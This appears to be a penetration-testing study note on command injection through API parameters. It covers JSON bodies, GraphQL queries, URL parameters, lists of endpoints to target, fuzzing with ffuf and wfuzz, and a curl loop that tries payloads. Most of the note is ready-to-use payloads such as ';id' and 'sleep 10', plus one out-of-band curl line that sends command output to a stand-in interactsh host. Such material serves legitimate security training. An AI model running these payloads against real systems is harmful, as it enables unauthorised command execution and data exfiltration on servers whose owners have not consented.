---
tags: [vapt, command-injection, intermediate]
difficulty: intermediate
module: "08 - Command Injection"
topic: "08.07 Command Injection in API Parameters"
---

# 08.07 — Command Injection in API Parameters

## APIs and OS Commands

Modern APIs often call OS utilities for specific functions: network utilities, media processing, PDF generation, code execution environments, antivirus scanning. REST API endpoints that accept parameters like `ip`, `host`, `domain`, `url`, `filename`, `command`, `query` are high-value targets.

```
HIGH-RISK API ENDPOINTS:
  POST /api/v1/network/ping    → runs ping
  POST /api/v1/dns/lookup      → runs nslookup/dig
  POST /api/v1/ssl/check       → runs openssl
  POST /api/v1/image/resize    → runs ImageMagick
  POST /api/v1/video/convert   → runs FFmpeg
  POST /api/v1/pdf/generate    → runs wkhtmltopdf
  POST /api/v1/scan/run        → runs antivirus
  POST /api/v1/debug/exec      → DEV ENDPOINT: obvious!
  POST /api/v1/search?q=       → runs grep on files
```

---

## JSON Body Injection

```bash
# STANDARD FORM:
POST /api/ping HTTP/1.1
Content-Type: application/json

{"host": "8.8.8.8"}

# INJECT IN JSON STRING:
{"host": "8.8.8.8;id"}
{"host": "8.8.8.8|id"}
{"host": "8.8.8.8&&id"}
{"host": "8.8.8.8$(id)"}
{"host": "8.8.8.8`id`"}

# BLIND TIME-BASED:
{"host": "8.8.8.8;sleep 10"}

# OOB:
{"host": "8.8.8.8;curl https://your-interactsh.com/$(id)"}

# CURL EXAMPLE:
curl -X POST https://target.com/api/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"host": "8.8.8.8;id"}'
```

---

## Multiple Parameters

```bash
# SOME APIS HAVE MULTIPLE INJECTION POINTS:

# DNS LOOKUP API:
POST /api/dns
{"domain": "example.com", "type": "A", "server": "8.8.8.8"}

# INJECT IN 'domain':
{"domain": "example.com;id", "type": "A", "server": "8.8.8.8"}

# INJECT IN 'server' (custom DNS server param):
{"domain": "example.com", "type": "A", "server": "8.8.8.8;id"}

# FILE CONVERSION API:
POST /api/convert
{"filename": "report.pdf", "format": "docx", "options": ""}

# INJECT IN 'filename':
{"filename": "report.pdf;id", "format": "docx", "options": ""}

# INJECT IN 'format' (passed to CLI tool):
{"filename": "report.pdf", "format": "docx;id", "options": ""}

# INJECT IN 'options' (CLI flags):
{"filename": "report", "format": "pdf", "options": "-o /tmp/x;id"}
```

---

## GraphQL Command Injection

```graphql
# VULNERABLE QUERY:
query {
  ping(host: "8.8.8.8") {
    result
  }
}

# INJECTION:
query {
  ping(host: "8.8.8.8;id") {
    result
  }
}

# MUTATION:
mutation {
  convertImage(filename: "photo.jpg;id") {
    url
  }
}

# CURL EXAMPLE:
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{ping(host:\"8.8.8.8;id\"){result}}"}'
```

---

## URL Parameter Injection

```bash
# GET REQUEST:
GET /api/network/resolve?domain=example.com HTTP/1.1

# INJECT:
GET /api/network/resolve?domain=example.com;id
GET /api/network/resolve?domain=example.com|id
GET /api/network/resolve?domain=example.com%3Bid  ← URL-encoded ;

# CURL:
curl "https://target.com/api/resolve?domain=example.com;id"
curl "https://target.com/api/resolve?domain=example.com%3Bid"

# BLIND:
curl "https://target.com/api/resolve?domain=example.com;sleep+10"
# → Measure response time!
```

---

## API Endpoints to Target (By Function)

```bash
# NETWORK UTILITIES:
/api/ping?host=
/api/traceroute?host=
/api/nslookup?domain=
/api/whois?domain=
/api/ssl-check?hostname=
/api/scan/port?host=&port=

# MEDIA PROCESSING:
/api/image/resize?file=
/api/image/thumbnail?url=
/api/video/convert?input=
/api/pdf/generate?url=
/api/ocr?file=

# SECURITY TOOLS:
/api/scan/malware?file=
/api/check/safe-url?url=
/api/validate/email?address=

# DEVELOPER/ADMIN:
/api/admin/exec?cmd=       ← OBVIOUS! Check disabled but accessible endpoints
/api/debug/run?script=
/api/shell?command=
/api/v1/system/status
```

---

## Automated API Testing

```bash
# FFUF TO FUZZ API PARAMETERS:
ffuf -u "https://target.com/api/ping?host=FUZZ" \
  -w xss_payloads.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200 -fc 400,403

# WFUZZ:
wfuzz -c -z file,cmdi_payloads.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"FUZZ"}' \
  "https://target.com/api/ping"

# DALFOX (can also test APIs):
dalfox url "https://target.com/api/ping?host=test"

# MANUAL CURL LOOP:
for payload in ";id" "|id" "&&id" "$(id)" "\`id\`"; do
  echo "Testing: $payload"
  curl -s -X POST "https://target.com/api/ping" \
    -H "Content-Type: application/json" \
    -d "{\"host\": \"8.8.8.8$payload\"}" | grep -i "uid\|gid"
done
```

---

## API Auth Bypass for Injection Testing

```bash
# IF API REQUIRES AUTH:
# 1. Get a token first:
curl -X POST https://target.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
# Response: {"token": "abc123"}

# 2. Use token in injection tests:
curl -X POST https://target.com/api/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer abc123" \
  -d '{"host": "8.8.8.8;id"}'

# OR IDOR: Test low-privilege endpoints that call backend system commands
# Low-privilege user → calls API → API calls OS command
# Privilege escalation via command injection!
```

---

## Related Notes
- [[01 - What is Command Injection]] — fundamentals
- [[04 - Blind Command Injection]] — blind testing
- [[Module 07 - API Security]] — API-specific testing
- [[10 - Command Injection to Reverse Shell]] — escalation
- [[Module 14 - GraphQL]] — GraphQL-specific testing
